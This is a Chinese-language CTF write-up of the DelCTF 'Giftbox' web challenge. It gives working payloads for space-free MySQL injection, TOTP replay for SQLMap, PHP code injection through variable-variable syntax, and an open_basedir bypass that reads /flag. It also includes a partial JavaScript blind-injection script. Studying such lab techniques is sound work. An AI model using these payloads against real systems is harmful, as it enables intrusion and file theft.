# DelCTF Web之Giftbox题解

## 0x1 前言
由于自身技术水平有限，我在比赛时没有深入研究题目，而是等待Writeup发布后再进行复盘。这次国际赛的Web题目虽然难度不高，但对CTF选手的基本功要求较高，涉及的知识面、脚本编写及模糊测试能力都需具备。这些题目更像是一种综合性的挑战。本文将分享我的解题过程，希望能为新手提供一些启示。

## 0x2 题目介绍
以下是解题过程中使用的相关环境信息：
- 送给小蛮腰的礼物，她是一位美丽的姑娘。
- A gift for Canton Tower, a pretty girl.
- http://207.148.79.106:8090 (sg-sgp)
- http://45.76.193.153:8090 (jp-tky)
- http://222.85.25.41:8090 (cn-zgz)
- http://136.244.114.21:8090 (fr-par)
- http://66.42.96.82:8090 (us-lax)

## 0x3 解题过程分析
### 0x3.1 定位注入点
通过以下命令找到`tamper`路径：
```bash
command: locate "*multiplespaces*"
```
进入该路径后，修改注入语句即可。需要注意的是，空格会被识别为命令分隔符，因此在构造注入语句时要避免使用空格。对于MySQL注入，可以使用如下Payload：
```sql
login xadmin'or(1)# 1234
login xadmin'or(0)# 1234
```

### 0x3.2 分析TOTP算法
抓包后发现`totp`参数类似于一个Token。查看前端代码并搜索关键字`totp`，可以找到其生成逻辑。TOTP（基于时间的一次性密码算法）根据预共享密钥与当前时间计算一次性密码。具体要求如下：
1. 令牌与服务器之间必须时钟同步；
2. 令牌与服务器之间必须共享密钥；
3. 令牌与服务器之间必须使用相同的时间步长。

算法公式为：
```plaintext
TOTP = Truncate(HMAC-SHA-1(K, (T - T0) / X))
```
其中，X表示时间间隔。

### 0x3.3 使用SQLMap进行注入
根据以上信息，可以直接使用Flask启动服务，并将请求转发给SQLMap进行注入。配置如下：
```python
totp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)
```
运行SQLMap后，获取到密码：`hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}`。

### 0x3.4 执行隐藏命令
根据提示，尝试执行隐藏命令`sh0w_hiiintttt_23333`，可以看到：
```plaintext
De1ta Nuclear Missile Controlling System
```
这是一个核弹控制系统。看到`eval`和`code`可以猜测是代码注入。尝试以下Payload：
```php
targeting a a";phpinfo();// 
```
发现被过滤。进一步分析发现PHP存在`variable variables`语法，双引号也可以执行代码。参考文章[从一道题讲PHP复杂变量](https://xz.aliyun.com/t/4785)。

最终Payload为：
```php
chdir('css');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));
```
这段代码通过改变目录结构绕过`open_basedir`限制，读取Flag文件。

### 0x3.5 前端AJAX注入
这里贴出@一叶飘零师傅写的脚本，原理类似，只是语言不同：
```javascript
async function ajax(username) {
    return new Promise(function (resolve, reject) {
        let ajaxSetting = {
            url: host + `/shell.php?a=login%20${encodeURIComponent(username)}%201&validthis=1&totp=${new TOTP("GAXG24JTMZXGKZBU",8).genOTP()}`,
            type: "GET",
            dataType: 'json',
            success: function (response) {
                resolve(response);
            },
            error: function () {
                reject("请求失败");
            }
        };
        $.ajax(ajaxSetting);
    });
}

async function test(username) {
    const res = await ajax(username);
    return res.message;
}

async function blind() {
    let ret = "";
    for (let j = 1; j < 10; j++) {
        // 模糊测试字符
    }
}
```

### 0x3.6 绕过`open_basedir`限制
通过调试PHP源码，理解`chdir`和`ini_set`的作用，可以绕过`open_basedir`限制。具体方法参考[初探php扩展之MAC下环境配置篇](https://xz.aliyun.com/t/4687)。

推荐书籍：[PHP7内核剖析](https://www.kancloud.cn/nickbai/php7/363315)。

希望以上内容能帮助大家更好地理解和解决类似问题。